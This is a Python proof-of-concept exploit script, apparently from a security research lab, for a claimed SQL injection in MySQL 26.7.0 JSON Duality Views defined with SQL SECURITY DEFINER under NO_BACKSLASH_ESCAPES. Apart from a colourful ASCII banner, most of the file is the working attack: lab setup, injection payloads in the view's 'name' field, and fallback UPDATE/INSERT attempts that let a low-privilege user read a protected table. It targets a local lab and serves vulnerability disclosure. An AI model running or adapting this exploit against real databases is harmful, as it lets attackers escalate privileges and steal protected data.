#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: mysql-jdv-definer-sqli (High: 8.1)
#  Vendor: MySQL Community Server (Oracle)
#  Versions: mysqld 26.7.0 JSON Duality View DML
#  Impact: DEFINER SQLi via NO_BACKSLASH_ESCAPES on JSON Duality DML
#  Requires: mysql:26.7.0 loopback; JDV with string column; victim DML on view; pymysql
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "mysql-jdv-definer-sqli"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove JSON Duality DEFINER DML SQLi under NO_BACKSLASH_ESCAPES on mysql 26.7.0."""

import json
import os
import sys

import pymysql

WITNESS = "MYSQL-JDV-DEFINER-SQLI-WITNESS"
LABEL = "mysql-jdv-definer-sqli"
IMAGE_TAG = "mysql:26.7.0"
HOST = "127.0.0.1"
PORT = 18640
VICTIM_USER = "victim"
VICTIM_PASS = "victimpass"

# SET-list injection for generated UPDATE ... SET `name` = _utf8mb4 '<esc>'
# escape_string_for_mysql turns ' into \'. With NO_BACKSLASH_ESCAPES that
# backslash-quote ends the literal. -- comments the leftover closer + WHERE.
INJECT_NAME = "x', name=(SELECT note FROM secret.s LIMIT 1)-- "
NBE_INJECT_NAME = "z', name=(SELECT note FROM secret.s LIMIT 1)-- "

# VALUES injection for generated INSERT ... VALUES (id, _utf8mb4 '<esc>')
INSERT_INJECT_NAME = "x'), (3, (SELECT note FROM secret.s LIMIT 1))-- "


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def connect(user: str, password: str, database=None):
    return pymysql.connect(
        host=HOST,
        port=PORT,
        user=user,
        password=password,
        database=database,
        autocommit=True,
        charset="utf8mb4",
        connect_timeout=10,
        read_timeout=60,
        write_timeout=30,
        client_flag=0,
    )


def fetch_one(cur, sql: str):
    cur.execute(sql)
    row = cur.fetchone()
    return None if row is None else row[0]


def exec_try(cur, sql: str):
    try:
        cur.execute(sql)
        return True, None, "ok"
    except pymysql.Error as exc:
        errno = exc.args[0] if exc.args else None
        msg = exc.args[1] if len(exc.args) > 1 else str(exc)
        return False, errno, str(msg)


def sql_quote(value: str) -> str:
    """Quote a SQL string with doubled quotes (valid with and without NBE)."""
    return "'" + value.replace("'", "''") + "'"


def as_text(value) -> str:
    if value is None:
        return ""
    if isinstance(value, (bytes, bytearray)):
        return value.decode("utf-8", "replace")
    if isinstance(value, (dict, list)):
        return json.dumps(value, separators=(",", ":"))
    return str(value)


def parse_json(value):
    if value is None:
        return None
    if isinstance(value, dict):
        return value
    text = as_text(value)
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return None


def inject_doc(row_id: int, etag=None, name: str = INJECT_NAME) -> str:
    doc = {"_id": row_id, "name": name}
    if etag:
        doc["_metadata"] = {"etag": etag}
    return json.dumps(doc, separators=(",", ":"))


def view_rows(cur):
    ok, errno, msg = exec_try(cur, "SELECT data FROM app.dv")
    if not ok:
        return False, errno, msg, []
    rows = []
    for row in cur.fetchall():
        rows.append(as_text(row[0] if row else None))
    return True, None, "ok", rows


def names_from_view(cur):
    ok, errno, msg, rows = view_rows(cur)
    names = []
    if not ok:
        return False, errno, msg, names, rows
    for raw in rows:
        obj = parse_json(raw)
        if isinstance(obj, dict) and "name" in obj:
            names.append(as_text(obj.get("name")))
            continue
        names.append(raw)
    return True, None, "ok", names, rows


def etag_for_id(cur, row_id: int):
    sql = (
        "SELECT JSON_UNQUOTE(JSON_EXTRACT(data, '$._metadata.etag')) "
        f"FROM app.dv WHERE JSON_EXTRACT(data, '$._id') = {int(row_id)}"
    )
    ok, errno, msg = exec_try(cur, sql)
    if not ok:
        return None, errno, msg
    row = cur.fetchone()
    if not row or row[0] is None:
        return None, None, "missing-etag"
    return as_text(row[0]), None, "ok"


def dml_view(cur, sql: str):
    return exec_try(cur, sql)


def main() -> None:
    log(f"lab={LABEL} image={IMAGE_TAG} host={HOST} port={PORT}")

    try:
        root = connect("root", "labroot")
    except pymysql.Error as exc:
        fail(f"root-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")

    with root:
        rcur = root.cursor()
        version = str(fetch_one(rcur, "SELECT VERSION()") or "")
        log(f"mysqld-version={version!r}")
        if "26.7.0" not in version:
            fail(f"version-mismatch version={version!r} image={IMAGE_TAG}")

        seed = [
            "CREATE DATABASE app",
            "CREATE DATABASE secret",
            "CREATE TABLE app.t (id INT PRIMARY KEY, name VARCHAR(512) NOT NULL)",
            "CREATE TABLE secret.s (id INT PRIMARY KEY, note VARCHAR(128) NOT NULL)",
            f"INSERT INTO secret.s VALUES (1, {sql_quote(WITNESS)})",
            "INSERT INTO app.t VALUES (1, 'ok')",
        ]
        for stmt in seed:
            ok, errno, msg = exec_try(rcur, stmt)
            log(f"seed {'ok' if ok else 'fail'} errno={errno} stmt={stmt!r} msg={msg!r}")
            if not ok:
                fail(f"seed-failed stmt={stmt!r} errno={errno} {msg}")

        create_stmts = [
            (
                "CREATE JSON DUALITY VIEW app.dv SQL SECURITY DEFINER AS "
                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
                '"_id" : id, "name" : name) FROM app.t'
            ),
            (
                "CREATE JSON DUALITY VIEW app.dv AS "
                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
                '"_id" : id, "name" : name) FROM app.t'
            ),
            (
                "CREATE JSON RELATIONAL DUALITY VIEW app.dv "
                "SQL SECURITY DEFINER AS "
                "SELECT JSON_DUALITY_OBJECT(WITH (INSERT, UPDATE, DELETE) "
                '"_id" : id, "name" : name) FROM app.t'
            ),
        ]
        create_ok = False
        create_errno = None
        create_msg = None
        create_used = None
        for stmt in create_stmts:
            ok, errno, msg = exec_try(rcur, stmt)
            log(f"CREATE VIEW attempt ok={ok} errno={errno} stmt={stmt!r} msg={msg!r}")
            if ok:
                create_ok = True
                create_used = stmt
                create_errno = None
                create_msg = "ok"
                break
            create_errno = errno
            create_msg = msg
            if errno in (1064, 1146, 1347) or (
                msg and "duality" in msg.lower() and "syntax" in msg.lower()
            ):
                continue
            if errno == 1050:
                create_ok = True
                create_used = stmt
                create_msg = "already-exists"
                break

        log(
            f"IOC CREATE VIEW ok={create_ok} errno={create_errno} "
            f"used={create_used!r} msg={create_msg!r}"
        )
        if not create_ok:
            fail(f"jdv-create-failed errno={create_errno} {create_msg}")

        show_create = None
        ok, errno, msg = exec_try(rcur, "SHOW CREATE VIEW app.dv")
        if ok:
            row = rcur.fetchone()
            show_create = as_text(row[1] if row and len(row) > 1 else row)
        log(f"SHOW CREATE VIEW errno={errno} sql={show_create!r}")

        user_seed = [
            f"CREATE USER '{VICTIM_USER}'@'%' IDENTIFIED BY '{VICTIM_PASS}'",
            f"GRANT SELECT, INSERT, UPDATE ON app.dv TO '{VICTIM_USER}'@'%'",
            "FLUSH PRIVILEGES",
        ]
        for stmt in user_seed:
            ok, errno, msg = exec_try(rcur, stmt)
            log(f"user-seed {'ok' if ok else 'fail'} errno={errno} stmt={stmt!r} msg={msg!r}")
            if not ok:
                fail(f"user-seed-failed stmt={stmt!r} errno={errno} {msg}")

        grants = None
        ok, errno, msg = exec_try(rcur, f"SHOW GRANTS FOR '{VICTIM_USER}'@'%'")
        if ok:
            grants = [as_text(row[0]) for row in rcur.fetchall()]
        log(f"IOC victim grant errno={errno} grants={grants!r}")
        rcur.close()

    try:
        victim = connect(VICTIM_USER, VICTIM_PASS)
    except pymysql.Error as exc:
        fail(f"victim-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")

    with victim:
        vcur = victim.cursor()
        current_user = fetch_one(vcur, "SELECT CURRENT_USER()")
        session_user = fetch_one(vcur, "SELECT USER()")
        log(f"victim-current-user={current_user!r} session-user={session_user!r}")

        secret_ok, secret_errno, secret_msg = exec_try(
            vcur, "SELECT note FROM secret.s"
        )
        log(
            f"IOC secret-direct ok={secret_ok} errno={secret_errno} msg={secret_msg!r}"
        )
        if secret_ok:
            fail("victim-secret=allowed expected-denied")
        if secret_errno not in (1142, 1143, 1141):
            log(f"secret-direct-errno-class={secret_errno} (expected 1142-class)")

        default_mode = fetch_one(vcur, "SELECT @@SESSION.sql_mode")
        log(f"IOC sql_mode default={default_mode!r}")

        ok, errno, msg, names, rows = names_from_view(vcur)
        log(f"view-before ok={ok} errno={errno} names={names!r} json={rows!r}")
        if not ok:
            fail(f"view-select-failed errno={errno} {msg}")

        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
        log(f"etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")

        # Negative: same payload without NO_BACKSLASH_ESCAPES.
        neg_doc = inject_doc(1, etag=etag)
        neg_sql = (
            f"UPDATE app.dv SET data = {sql_quote(neg_doc)} "
            "WHERE JSON_EXTRACT(data, '$._id') = 1"
        )
        neg_ok, neg_errno, neg_msg = dml_view(vcur, neg_sql)
        log(
            f"IOC default-mode UPDATE ok={neg_ok} errno={neg_errno} "
            f"msg={neg_msg!r} sql={neg_sql!r}"
        )
        if not neg_ok:
            ins_doc = inject_doc(2, name=INJECT_NAME)
            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
            ins_ok, ins_errno, ins_msg = dml_view(vcur, ins_sql)
            log(
                f"IOC default-mode INSERT ok={ins_ok} errno={ins_errno} "
                f"msg={ins_msg!r} sql={ins_sql!r}"
            )
            neg_ok, neg_errno, neg_msg = ins_ok, ins_errno, ins_msg

        ok, errno, msg, names, rows = names_from_view(vcur)
        log(
            f"IOC default-mode view ok={ok} errno={errno} names={names!r} json={rows!r}"
        )
        default_has_witness = any(WITNESS in n for n in names)
        if default_has_witness:
            fail("default-mode-inject=yes expected-no")

        # Reset name so the NBE document is not skipped as unchanged.
        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
        reset_doc = inject_doc(1, etag=etag, name="ok")
        reset_sql = (
            f"UPDATE app.dv SET data = {sql_quote(reset_doc)} "
            "WHERE JSON_EXTRACT(data, '$._id') = 1"
        )
        reset_ok, reset_errno, reset_msg = dml_view(vcur, reset_sql)
        log(
            f"reset-after-negative ok={reset_ok} errno={reset_errno} "
            f"msg={reset_msg!r} etag={etag!r}"
        )
        if not reset_ok:
            fail(f"reset-after-negative-failed errno={reset_errno} {reset_msg}")
        ok, errno, msg, names, rows = names_from_view(vcur)
        log(f"view-after-reset ok={ok} names={names!r} json={rows!r}")

        vcur.close()

    try:
        victim_nbe = connect(VICTIM_USER, VICTIM_PASS)
    except pymysql.Error as exc:
        fail(f"victim-nbe-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")

    nbe_method = None
    nbe_errno = None
    nbe_msg = None
    with victim_nbe:
        vcur = victim_nbe.cursor()
        ok, errno, msg = exec_try(
            vcur, "SET SESSION sql_mode='NO_BACKSLASH_ESCAPES'"
        )
        log(f"SET NBE ok={ok} errno={errno} msg={msg!r}")
        if not ok:
            fail(f"set-nbe-failed errno={errno} {msg}")
        nbe_mode = fetch_one(vcur, "SELECT @@SESSION.sql_mode")
        log(f"IOC sql_mode nbe={nbe_mode!r}")
        if "NO_BACKSLASH_ESCAPES" not in str(nbe_mode or ""):
            fail(f"nbe-not-set sql_mode={nbe_mode!r}")

        etag, etag_errno, etag_msg = etag_for_id(vcur, 1)
        log(f"nbe-etag-id1={etag!r} errno={etag_errno} msg={etag_msg!r}")
        nbe_doc = inject_doc(1, etag=etag, name=NBE_INJECT_NAME)
        nbe_sql = (
            f"UPDATE app.dv SET data = {sql_quote(nbe_doc)} "
            "WHERE JSON_EXTRACT(data, '$._id') = 1"
        )
        nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, nbe_sql)
        log(
            f"IOC NBE UPDATE ok={nbe_ok} errno={nbe_errno} "
            f"msg={nbe_msg!r} sql={nbe_sql!r}"
        )
        nbe_method = "UPDATE"

        if not nbe_ok:
            # Retry UPDATE without etag, then INSERT of a new _id.
            nbe_doc2 = inject_doc(1)
            nbe_sql2 = (
                f"UPDATE app.dv SET data = {sql_quote(nbe_doc2)} "
                "WHERE JSON_EXTRACT(data, '$._id') = 1"
            )
            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, nbe_sql2)
            log(
                f"IOC NBE UPDATE-no-etag ok={nbe_ok} errno={nbe_errno} "
                f"msg={nbe_msg!r} sql={nbe_sql2!r}"
            )
            nbe_method = "UPDATE-no-etag"

        if not nbe_ok:
            ins_doc = inject_doc(2, name=INSERT_INJECT_NAME)
            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, ins_sql)
            log(
                f"IOC NBE INSERT ok={nbe_ok} errno={nbe_errno} "
                f"msg={nbe_msg!r} sql={ins_sql!r}"
            )
            nbe_method = "INSERT"

        if not nbe_ok:
            ins_doc = inject_doc(4, name=INJECT_NAME)
            ins_sql = f"INSERT INTO app.dv VALUES ({sql_quote(ins_doc)})"
            nbe_ok, nbe_errno, nbe_msg = dml_view(vcur, ins_sql)
            log(
                f"IOC NBE INSERT-setlist ok={nbe_ok} errno={nbe_errno} "
                f"msg={nbe_msg!r} sql={ins_sql!r}"
            )
            nbe_method = "INSERT-setlist"

        log(
            f"IOC NBE DML method={nbe_method} ok={nbe_ok} errno={nbe_errno} "
            f"msg={nbe_msg!r}"
        )

        ok, errno, msg, names, rows = names_from_view(vcur)
        log(f"IOC NBE view ok={ok} errno={errno} names={names!r} json={rows!r}")
        if not ok:
            fail(f"nbe-view-select-failed errno={errno} {msg}")
        view_has_witness = any(WITNESS in n for n in names)
        if not view_has_witness:
            fail(
                f"view-has-witness=no nbe-inject={'yes' if nbe_ok else 'no'} "
                f"method={nbe_method} errno={nbe_errno} names={names!r}"
            )

        vcur.close()

    dump_ver = "26.7.0"
    log(
        f"SUCCESS {LABEL} victim-secret=denied nbe-inject=yes "
        f"view-has-witness=yes default-mode-inject=no dump={dump_ver} "
        f"image={IMAGE_TAG} {WITNESS}"
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception={type(exc).__name__}:{exc}")
        sys.exit(1)

